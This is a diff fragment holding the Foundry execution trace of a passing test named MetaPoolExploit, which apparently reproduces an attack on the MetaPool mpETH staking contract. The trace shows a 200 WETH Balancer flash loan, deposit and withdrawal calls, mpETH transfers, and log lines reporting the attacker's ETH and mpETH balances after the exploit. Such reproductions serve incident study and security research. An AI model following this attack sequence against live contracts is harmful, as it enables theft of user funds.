+    │   │   │   │   ├─ emit Deposit(dst: MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], wad: 105893377554059829450 [1.058e20])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x00000000000000000000000000000000000000000000000595660a0883748762 → 0x00000000000000000000000000000000000000000000000b52f6e3df1b83a82c
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [3262] WETH9::transfer(Vault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], 200000000000000000000 [2e20])
+    │   │   │   │   ├─ emit Transfer(from: MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: Vault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], value: 200000000000000000000 [2e20])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x00000000000000000000000000000000000000000000000b52f6e3df1b83a82c → 0x0000000000000000000000000000000000000000000000007b6827845563a82c
+    │   │   │   │   │   @ 0x3a0f132b80eb284c2ac247698d2ec7dce851ca420b700161ad6082d0e9762150: 0x0000000000000000000000000000000000000000000005ee87fb678a935df16b → 0x0000000000000000000000000000000000000000000005f95f8a23e5597df16b
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WETH9::balanceOf(MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   └─ ← [Return] 8892400913564805164 [8.892e18]
+    │   │   │   ├─ [9195] WETH9::withdraw(8892400913564805164 [8.892e18])
+    │   │   │   │   ├─ [55] MetaPoolExploit::receive{value: 8892400913564805164}()
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ emit Withdrawal(src: MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], wad: 8892400913564805164 [8.892e18])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x0000000000000000000000000000000000000000000000007b6827845563a82c → 0
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [55] MetaPool::receive{value: 8892400913564805164}()
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [1313] TransparentUpgradeableProxy::fallback(MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   ├─ [653] Staking::balanceOf(MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 77787742211965048957 [7.778e19]
+    │   │   │   │   └─ ← [Return] 77787742211965048957 [7.778e19]
+    │   │   │   ├─ [25679] TransparentUpgradeableProxy::fallback(MetaPool: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 77787742211965048957 [7.778e19])
+    │   │   │   │   ├─ [25016] Staking::transfer(MetaPool: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 77787742211965048957 [7.778e19]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: MetaPool: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 77787742211965048957 [7.778e19])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x2ecaf71f466ee5955d0b826a6054602f6f53dd5d8483d05745a7d277a0eaa919: 0x0000000000000000000000000000000000000000000000043785936797d5d87d → 0
+    │   │   │   │   │   │   @ 0xf85b56951f6ca259eb015e4162809ffc1dd28bc06ffa5a7aa716f2780313bdca: 0 → 0x0000000000000000000000000000000000000000000000043785936797d5d87d
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [534] WETH9::balanceOf(Vault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [staticcall]
+    │   │   │   └─ ← [Return] 28211956043150249554283 [2.821e22]
+    │   │   ├─ emit FlashLoan(recipient: MetaPoolExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], token: WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], amount: 200000000000000000000 [2e20], feeAmount: 0)
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [1313] TransparentUpgradeableProxy::fallback(MetaPool: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [653] Staking::balanceOf(MetaPool: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 77787742211965048957 [7.778e19]
+    │   └─ ← [Return] 77787742211965048957 [7.778e19]
+    ├─ [0] console::log("Attacker mpETH balance After exploit: ", 77787742211965048957 [7.778e19]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ emit log_named_decimal_uint(key: "Attacker After exploit ETH Balance", val: 8892400913564805164 [8.892e18], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.72s (3.97s CPU time)
+
+Ran 1 test suite in 8.37s (4.72s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
